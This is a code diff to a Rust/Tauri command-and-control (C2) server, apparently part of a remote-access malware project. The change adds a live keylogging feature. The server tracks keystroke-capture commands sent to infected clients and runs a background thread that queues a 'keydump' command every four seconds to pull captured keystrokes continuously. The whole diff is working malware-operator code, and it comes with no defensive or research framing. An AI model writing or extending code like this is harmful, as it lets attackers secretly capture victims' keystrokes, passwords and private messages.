@@ -48,6 +48,12 @@ use std::path::Path;
 /// used by client.py/server.py (the default Aes256Gcm alias uses 12-byte nonces).
 type Aes256GcmLong = AesGcm<Aes256, U16>;
 
+pub struct KeylogStream {
+    pub active: bool,
+    pub client_id: Option<String>,
+    pub waiting: bool,
+}
+
 pub struct AppState {
     pub clients: Mutex<Vec<Client>>,
     pub logs: Mutex<Vec<CommandLog>>,
@@ -56,6 +62,7 @@ pub struct AppState {
     pub rsa_public_pem: String,
     pub client_sessions: Mutex<std::collections::HashMap<String, Vec<u8>>>,
     pub log_counter: Mutex<i32>,
+    pub keylog_stream: Mutex<KeylogStream>,
 }
 
 // === C2 listener tuning ===
@@ -427,8 +434,12 @@ fn preview_file(path: String) -> PreviewData {
 
 #[tauri::command]
 fn send_command(client_id: String, command: String, state: State<Arc<AppState>>) -> String {
+    let cid = client_id.trim().to_string();
+    if cid.is_empty() {
+        return "ERR_NO_TARGET".to_string();
+    }
     let mut pending = state.pending_commands.lock().unwrap();
-    pending.entry(client_id.clone()).or_insert(vec![]).push(command.clone());
+    pending.entry(cid.clone()).or_insert(vec![]).push(command.clone());
 
     let mut logs = state.logs.lock().unwrap();
     let new_id = {
@@ -438,7 +449,7 @@ fn send_command(client_id: String, command: String, state: State<Arc<AppState>>)
     };
     logs.push(CommandLog {
         id: new_id,
-        client_id,
+        client_id: cid,
         command,
         output: "Queued...".to_string(),
         timestamp: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
@@ -622,6 +633,37 @@ fn handle_c2_request(mut request: tiny_http::Request, state: &Arc<AppState>) {
             let client_id = clean_client_id(raw_id, &client_ip, pid);
             let output = data["output"].as_str().unwrap_or("").to_string();
             let command_name = data["command"].as_str().unwrap_or("Result").to_string();
+
+            // Keystroke stream lifecycle: mirrors server.py
+            let mut is_auto_dump = false;
+            {
+                let mut kls = state.keylog_stream.lock().unwrap();
+                if command_name == "keystart" && output.contains("started") {
+                    kls.active = true;
+                    kls.client_id = Some(client_id.clone());
+                    kls.waiting = false;
+                    println!("[+] Live keystroke stream ON → {}", client_id);
+                } else if command_name == "keystop" || command_name == "kill" {
+                    if kls.client_id.as_deref() == Some(&client_id) {
+                        let was = kls.active;
+                        kls.active = false;
+                        kls.client_id = None;
+                        kls.waiting = false;
+                        if was { println!("[*] Keystroke stream stopped for {}", client_id); }
+                    }
+                } else if command_name == "keydump" {
+                    if kls.active && kls.client_id.as_deref() == Some(&client_id) {
+                        is_auto_dump = true;
+                        kls.waiting = false;
+                        // Suppress idle tick - nothing captured
+                        if output.starts_with("[*] No keystrokes") {
+                            let _ = request.respond(tiny_http::Response::from_string("OK"));
+                            return;
+                        }
+                    }
+                }
+            }
+
             let mut logs = state.logs.lock().unwrap();
 
             // Check if this is telemetry data
@@ -729,7 +771,44 @@ pub fn run() {
         rsa_public_pem: rsa_pub_pem,
         client_sessions: Mutex::new(std::collections::HashMap::new()),
         log_counter: Mutex::new(0),
+        keylog_stream: Mutex::new(KeylogStream { active: false, client_id: None, waiting: false }),
     });
+
+    // Live keystroke stream: while active, queue `keydump` every 4s (mirrors server.py)
+    {
+        let kls_state = Arc::clone(&app_state);
+        thread::spawn(move || {
+            let mut tick: u64 = 0;
+            loop {
+                thread::sleep(std::time::Duration::from_secs(1));
+                tick = tick.wrapping_add(1);
+                if tick % 4 != 0 { continue; }
+                let cid_opt = {
+                    let kls = kls_state.keylog_stream.lock().unwrap();
+                    if !kls.active || kls.waiting { None } else { kls.client_id.clone() }
+                };
+                let Some(cid) = cid_opt else { continue; };
+                // Client still alive?
+                let alive = { kls_state.clients.lock().unwrap().iter().any(|c| c.id == cid) };
+                if !alive {
+                    let mut kls = kls_state.keylog_stream.lock().unwrap();
+                    if kls.client_id.as_deref() == Some(&cid) {
+                        kls.active = false; kls.client_id = None; kls.waiting = false;
+                        println!("[*] Keystroke stream stopped — client disconnected {}", cid);
+                    }
+                    continue;
+                }
+                {
+                    let mut pending = kls_state.pending_commands.lock().unwrap();
+                    pending.entry(cid.clone()).or_insert_with(Vec::new).push("keydump".to_string());
+                }
+                {
+                    let mut kls = kls_state.keylog_stream.lock().unwrap();
+                    if kls.client_id.as_deref() == Some(&cid) { kls.waiting = true; }
+                }
+            }
+        });
+    }
 
     let state_for_thread = Arc::clone(&app_state);
     thread::spawn(move || {
